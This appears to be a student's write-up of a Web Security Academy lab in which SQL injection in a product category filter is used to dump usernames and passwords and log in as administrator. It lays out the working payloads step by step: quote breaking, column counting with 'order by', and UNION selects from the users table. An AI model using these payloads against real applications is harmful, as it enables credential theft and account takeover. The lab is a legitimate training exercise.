# Lab: SQL injection UNION attack, retrieving multiple values in a single column

- sqli: product category 
- end goal: retrieves all usernames and passwords and login as administrator user

### Analysis
- url: `https://0a4a006503f28d10808b9e12003f0018.web-security-academy.net/`

- front-end: `/filter?category=Accessories`
- back-end:
```sql
select * from prodct where category = 'Accessories' and released = 1
```

- check sqli vulnerability
- front-end: `/filter?category=Accessories'`
- back-end:
```sql
select * from prodct where category = 'Accessories'' and released = 1
'-- 500 Internal Server Error
```

- front-end: `/filter?category=Accessories'--`
- back-end:
```sql
select * from prodct where category = 'Accessories'--' and released = 1
-- 200 OK
```

- determine how many columns are contain on this website
- front-end: `/filter?category=Accessories' order by 2--`
- back-end:
```sql
select * from prodct where category = 'Accessories' order by 2--' and released = 1
-- 200 OK: I found 2 columns which contain this website
```

- determine which columns are contain text
this website
- front-end: `/filter?category=Accessories' union select null, 'a'--`
- back-end:
```sql
select * from prodct where category = 'Accessories' union select null, 'a'--' and released = 1
-- 200 OK: I found 1 column is contain with text
```

- output data from other tables
- front-end: `/filter?category=Accessories' union select null, username from users--`
- back-end:
```sql
select * from prodct where category = 'Accessories' union select null, username from users--' and released = 1
-- 200 OK: username: administrator
```
- front-end: `/filter?category=Accessories' union select null, password from users--`
- back-end:
```sql
select * from prodct where category = 'Accessories' union select null, password from users--' and released = 1
-- 200 OK: password: 0fa867hlfg4hpfgh9k00
```
- login administrator account
- Congratulations, you solved the lab!

---